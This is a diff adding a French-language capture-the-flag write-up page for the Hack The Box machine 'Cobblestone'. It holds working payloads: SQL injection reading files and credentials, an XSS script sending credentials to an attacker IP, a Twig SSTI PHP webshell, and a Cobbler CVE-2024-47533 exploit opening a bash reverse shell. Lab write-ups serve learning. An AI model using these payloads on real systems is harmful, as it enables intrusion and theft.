@@ -1,0 +1,226 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - Cobblestone">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - Cobblestone</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-insane">Insane</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Linux — Debian 12</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">18 Apr 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2024-47533</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #8b0000; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Insane Linux — chaîne de 5 vulnérabilités : SQLi UNION + Second-Order SQLi pour lire les fichiers système, XSS stocké dans le champ Username pour bypass restriction IP et promotion admin, SSTI Twig via bouton Preview pour RCE, crack SHA256 pour SSH cobble, puis CVE-2024-47533 (Cobbler 3.3.6 auth bypass) pour RCE root via template Cheetah. Durée totale : ~12 heures.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'SQLi UNION + Second-Order SQLi', r:'Lecture fichiers système + credentials DB cobblestone' },
+        { n:'2', v:'XSS Stocké (champ Username)', r:'Exécution JS depuis 127.0.0.1, bypass restriction IP, compte admin' },
+        { n:'3', v:'SSTI Twig (bouton Preview)', r:'RCE www-data, webshell PHP, hash SHA256 cobble' },
+        { n:'4', v:'Hashcat SHA256', r:'SSH cobble + user flag' },
+        { n:'5', v:'CVE-2024-47533 — Cobbler 3.3.6 Auth Bypass XML-RPC', r:'RCE root via template Cheetah' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#8b000022; color:#ef4444; border:1px solid #8b000044;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Reconnaissance & Vhosts</h2>
+    <pre is:raw>nmap -sC -sV 10.129.232.170
+# 22/tcp SSH, 80/tcp Apache (deploy.cobblestone.htb)
+echo '10.129.232.170 cobblestone.htb deploy.cobblestone.htb' | sudo tee -a /etc/hosts
+
+# Fuzzing vhosts — filtrer par taille de réponse par défaut
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u http://10.129.232.170 -H 'Host: FUZZ.cobblestone.htb' -fs 1745
+# vote [Status: 200]</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE : Sans -fs 1745 (taille de réponse par défaut), ffuf ne retourne aucun résultat — toutes les réponses non-matchantes ont la même taille.</div>
+
+    <h2>2 — SQL Injection UNION + Second-Order SQLi</h2>
+    <pre is:raw>sqlmap -r suggest.req --batch --level=3 --risk=2 --dbs
+# Type: UNION query - 5 colonnes
+# available databases: information_schema, vote
+
+sqlmap -r suggest.req --batch --file-read=/etc/apache2/sites-enabled/000-default.conf
+# RÉSULTAT CRITIQUE : ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
+# → API Cobbler interne exposée !</pre>
+    <p>Second-Order SQLi dans details.php : l'URL soumise via suggest.php est réinsérée sans sanitisation dans une nouvelle requête SQL dont le résultat est affiché dans la page. Permet d'exfiltrer des données avec affichage direct.</p>
+    <pre is:raw>COOKIE="PHPSESSID=xxx"
+ID=$(curl -s -b "$COOKIE" -X POST http://vote.cobblestone.htb/suggest.php \
+  -d "url=' UNION SELECT 1,LOAD_FILE('/var/www/html/db/connection.php'),3,4,5-- -" \
+  -D - | grep Location | grep -o 'id=[0-9]*' | cut -d= -f2)
+
+curl -s -b "$COOKIE" "http://vote.cobblestone.htb/details.php?id=$ID"
+# credentials: dbuser:[REDACTED]</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE : LOAD_FILE sur /var/www/html/db/ échouait (permissions MySQL). sqlmap --file-read utilisait d'autres techniques (boolean-based blind). Aide HomerEngue (Discord HTB) sur le chemin exact.</div>
+
+    <h2>3 — XSS Stocké → Bypass Restriction IP → Admin</h2>
+    <p>user.php vérifie que REMOTE_ADDR == register_ip. Le champ Username du formulaire de suggestion de skin est rendu par un browser headless côté serveur → exécuté depuis 127.0.0.1.</p>
+    <pre is:raw>// pwn.js — exécuté depuis 127.0.0.1 par le browser headless
+(async () => {
+  const user = 'hacker10', pass = 'Hacker123!', email = 'h@x.htb'
+
+  // S'inscrire depuis 127.0.0.1 → register_ip = 127.0.0.1 en base
+  await fetch('/register.php', { method:'POST', credentials:'include',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body: new URLSearchParams({username:user,first:'x',last:'x',email,password:pass}) });
+
+  // Se connecter
+  await fetch('/login.php', { method:'POST', credentials:'include',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body: new URLSearchParams({username:user,password:pass}) });
+
+  // Promouvoir admin (REMOTE_ADDR = 127.0.0.1 = register_ip ✓)
+  for (const id of ['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20']) {
+    await fetch('/user.php', { method:'POST', credentials:'include',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body: new URLSearchParams({id, name:user, first:'x', last:'x', email, role:'admin'}) });
+  }
+
+  new Image().src = 'http://10.10.14.51:8000/?done=' + btoa(user+':'+pass);
+})();</pre>
+    <pre is:raw>python3 -m http.server 8000
+# Dans cobblestone.htb :
+# Username    : &lt;script src="http://10.10.14.51:8000/pwn.js"&gt;&lt;/script&gt;
+# Skin name   : test
+# Download url: http://10.10.14.51:8000/test
+
+# Logs attendus :
+# 10.129.232.170 - "GET /pwn.js HTTP/1.1" 200
+# 10.129.232.170 - "GET /?done=aGFja2VyMTA6SGFja2VyMTIzIQ==" 200
+
+echo 'aGFja2VyMTA6SGFja2VyMTIzIQ==' | base64 -d
+# hacker10:Hacker123!</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE : Le XSS doit être dans le champ Username, PAS dans l'URL. L'URL est fetchée côté client (depuis notre machine), pas côté serveur. Aide HomerEngue (Discord HTB).</div>
+
+    <h2>4 — SSTI Twig → RCE www-data</h2>
+    <pre is:raw># Tester SSTI dans firstname via User Management
+# Firstname : {{'{'}{{'{'}}7*7{{'}'}}{{'}'}}
+# Preview → "Welcome 49" ✓
+
+# Payload RCE — écriture webshell dans /skins/
+{{'{'}{{'{'}} ["echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' > /var/www/html/skins/shell.php"]|filter('system') {{'}'}}{'}'} 
+
+curl "http://cobblestone.htb/skins/shell.php?cmd=id"
+# uid=33(www-data)</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE : AppArmor bloque les connexions sortantes de www-data. Pas de reverse shell direct possible. Utiliser des scripts PHP intermédiaires écrits via SSTI pour interroger la base de données.</div>
+    <pre is:raw># Dump de la DB cobblestone via script PHP intermédiaire
+# → hash SHA256 de cobble extrait
+hashcat -m 1400 cobble_hash.txt /usr/share/wordlists/rockyou.txt --force
+# Status: Cracked → [MOT_DE_PASSE_REDACTED]
+
+ssh cobble@10.129.232.170
+cat ~/user.txt</pre>
+
+    <h2>5 — CVE-2024-47533 : Cobbler 3.3.6 Auth Bypass → root</h2>
+    <p>Cobbler 3.3.6 tourne en root sur le port interne 25151. CVE-2024-47533 : login('', -1) avec un entier (pas une chaîne) court-circuite complètement la vérification et retourne un token admin valide.</p>
+    <pre is:raw>ssh cobble@10.129.232.170 -L 25151:127.0.0.1:25151
+
+# Vérification de la version
+curl -s -H "Content-Type: text/xml" \
+  -d '&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;version&lt;/methodName&gt;&lt;params/&gt;&lt;/methodCall&gt;' \
+  http://127.0.0.1:25151
+# 3.306 → Cobbler 3.3.6
+
+python3 -c "
+import xmlrpc.client
+s = xmlrpc.client.ServerProxy('http://127.0.0.1:25151/RPC2')
+t = s.login('', -1)   # username vide + password entier = auth bypass
+print('Token:', t)
+"
+# Token valide sans credential !</pre>
+    <pre is:raw># exploit.py — auth bypass + RCE root via template Cheetah
+import xmlrpc.client
+TARGET = "http://127.0.0.1:25151"
+LHOST, LPORT = "10.10.14.51", "4444"
+
+# La syntaxe #set exécute Python lors du rendu par cobblerd (root)
+payload = f"""#set $null = __import__('os').system('bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"')
+lang en_US
+keyboard us
+network --bootproto=dhcp
+rootpw --plaintext cobbler
+timezone UTC
+bootloader --location=mbr
+clearpart --all --initlabel
+autopart
+reboot
+"""
+
+s = xmlrpc.client.ServerProxy(TARGET)
+t = s.login("", -1)   # CVE-2024-47533
+
+s.write_autoinstall_template("pwn.ks", payload, t)
+
+did = s.new_distro(t)
+s.modify_distro(did, "name", "pwn_distro", t)
+s.modify_distro(did, "kernel", "/boot/vmlinuz-6.1.0-37-amd64", t)
+s.modify_distro(did, "initrd", "/boot/initrd.img-6.1.0-37-amd64", t)
+s.save_distro(did, t)
+
+pid = s.new_profile(t)
+s.modify_profile(pid, "name", "pwnprof", t)
+s.modify_profile(pid, "distro", "pwn_distro", t)
+s.modify_profile(pid, "autoinstall", "pwn.ks", t)
+s.save_profile(pid, t)
+
+s.generate_profile_autoinstall("pwnprof")   # Trigger !</pre>
+    <pre is:raw>nc -lvnp 4444 &
+python3 exploit.py
+# root@cobblestone:/# whoami → root
+cat /root/root.txt</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ BLOCAGE : Créer le distro avec les fichiers kernel existants AVANT le profil. Sans distro valide, generate_profile_autoinstall lève ValueError "distribution pwn_distro not found".</div>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'Vhost fuzzing : toujours filtrer par la taille de réponse par défaut (-fs)',
+        'Second-Order SQLi : une donnée stockée proprement peut être réinjectée dangereusement',
+        'XSS : tester TOUS les champs — le Username, pas seulement les champs évidents',
+        'SSTI Twig : le bouton Preview peut être le déclencheur, pas le formulaire d\'inscription',
+        'AppArmor bloque les connexions sortantes : utiliser des scripts PHP intermédiaires',
+        'CVE-2024-47533 : login(\'\', -1) avec un entier — pas une chaîne vide \'-1\'',
+        'Cobbler : créer le distro avec kernel existants AVANT le profil',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','ffuf','sqlmap','burpsuite','python3 (pwn.js + exploit Cobbler)','hashcat','ssh','xmlrpc.client'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
